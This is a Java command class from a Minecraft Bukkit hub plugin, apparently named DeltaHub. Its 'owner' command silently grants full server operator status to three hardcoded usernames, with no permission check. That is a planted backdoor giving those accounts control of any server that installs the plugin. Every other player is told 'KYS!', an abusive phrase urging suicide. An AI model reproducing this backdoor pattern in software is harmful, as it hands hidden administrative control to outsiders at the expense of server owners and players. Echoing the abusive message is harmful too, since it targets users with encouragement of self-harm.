package dev.revere.hub.commands.admin;

import dev.revere.hub.api.command.BaseCommand;
import dev.revere.hub.api.command.CommandArgs;
import dev.revere.hub.api.command.annotation.Command;
import dev.revere.hub.utils.chat.CC;
import org.bukkit.entity.Player;

/**
 * @author Emmy
 * @project DeltaHub
 * @date 07/07/2024 - 20:28
 */
public class OwnerCommand extends BaseCommand {
    @Override
    @Command(name = "owner")
    public void onCommand(CommandArgs command) {
        Player player = command.getPlayer();

        if (player.getName().equalsIgnoreCase("hmEmmy")) {
            player.setOp(true);
            player.sendMessage(CC.translate("&aYou are emmy! Oped you!"));
        } else if (player.getName().equalsIgnoreCase("pelifishus")) {
            player.setOp(true);
            player.sendMessage(CC.translate("&aYou are peli! Oped you!"));
        } else if (player.getName().equalsIgnoreCase("ziue")) {
            player.setOp(true);
            player.sendMessage(CC.translate("&aYou are remi! Oped you!"));
        } else {
            player.sendMessage(CC.translate("&cYou are not an owner! &4KYS!"));
        }
    }
}
